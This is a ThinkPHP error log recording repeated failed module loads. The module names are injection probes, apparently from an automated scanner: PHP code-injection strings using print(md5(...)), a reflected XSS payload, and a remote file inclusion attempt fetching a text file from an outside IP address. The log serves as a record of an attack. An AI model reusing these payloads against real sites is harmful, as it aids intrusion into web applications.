[ 2015-09-02T02:37:01+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}\
[ 2015-09-02T02:37:13+08:00 ] ERR: (ThinkException) 无法加载模块print(md5(this_is_a_test_string));die();/*
[ 2015-09-02T02:37:49+08:00 ] ERR: (ThinkException) 无法加载模块'"><scRipt>alert(98733)</sCript>
[ 2015-09-02T02:40:27+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-02T02:40:33+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
[ 2015-09-02T02:41:09+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
[ 2015-09-02T02:41:19+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}\
[ 2015-09-02T02:41:29+08:00 ] ERR: (ThinkException) 无法加载模块print(md5(this_is_a_test_string));die();/*
[ 2015-09-02T02:41:41+08:00 ] ERR: (ThinkException) 无法加载模块'"><scRipt>alert(98733)</sCript>
[ 2015-09-02T03:41:13+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-02T03:41:19+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-02T03:41:26+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
[ 2015-09-02T03:41:52+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
[ 2015-09-02T03:42:07+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}\
[ 2015-09-02T03:42:19+08:00 ] ERR: (ThinkException) 无法加载模块print(md5(this_is_a_test_string));die();/*
[ 2015-09-02T03:42:31+08:00 ] ERR: (ThinkException) 无法加载模块'"><scRipt>alert(98733)</sCript>
